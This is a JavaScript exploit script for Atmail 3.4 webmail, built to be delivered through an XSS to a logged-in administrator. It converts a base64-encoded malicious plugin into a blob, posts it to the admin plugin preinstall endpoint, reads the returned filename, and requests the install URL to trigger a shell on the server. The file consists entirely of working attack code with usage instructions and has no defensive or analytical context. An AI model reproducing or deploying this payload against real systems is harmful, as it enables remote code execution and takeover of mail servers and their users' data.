// Atmail 3.4 (maybe lower versions, idk) malicious plugin upload
// use a well-known XSS to have an admin that is logged into BOTH
// webmail and the admin control panel to trigger this.
// change atmail on line 35 to the IP address of the victim
// create malicious plugin named plugin.tgz
// get base64Data from this command: cat plugin.tgz | base64 -w0

var base64Data = ""
var contentType = "application/x-compressed-tar"


// https://www.dubget.com/file-upload-via-xss.html
function base64toBlob(base64Data, contentType) {
    contentType = contentType || '';
    var sliceSize = 1024;
    var byteCharacters = atob(base64Data);
    var bytesLength = byteCharacters.length;
    var slicesCount = Math.ceil(bytesLength / sliceSize);
    var byteArrays = new Array(slicesCount);

    for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {
        var begin = sliceIndex * sliceSize;
        var end = Math.min(begin + sliceSize, bytesLength);

        var bytes = new Array(end - begin);
        for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
            bytes[i] = byteCharacters[offset].charCodeAt(0);
        }
        byteArrays[sliceIndex] = new Uint8Array(bytes);
    }
    return new Blob(byteArrays, { type: contentType });
}

function trigger_shell(filename) {
    var uri = "http://atmail/index.php/admin/plugins/add/file/" + filename;
    var xhr = new XMLHttpRequest();
    xhr.open("GET", uri, true);
    xhr.send(null);
    return;
}

function upload_shell() {
    var uri = "/index.php/admin/plugins/preinstall";
    var formData = new FormData();
    formData.append("newPlugin", blob, 'plugin.tgz');
    var xhr = new XMLHttpRequest();
    xhr.open('POST', uri);
    xhr.send(formData);
    //get filename to return
    xhr.onreadystatechange = function () {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            // I'm sure there's a better way to do this. 
            var body = xhr.responseText;
            var parser = new DOMParser();
            var doc = parser.parseFromString(body, "text/html");
            var filename_start = body.search("file/") + 5;
            var filename_end = filename_start + 16;
            var filename = body.slice(filename_start, filename_end);
            trigger_shell(filename);
        }
    }
}

var blob = base64toBlob(base64Data, contentType);
upload_shell();
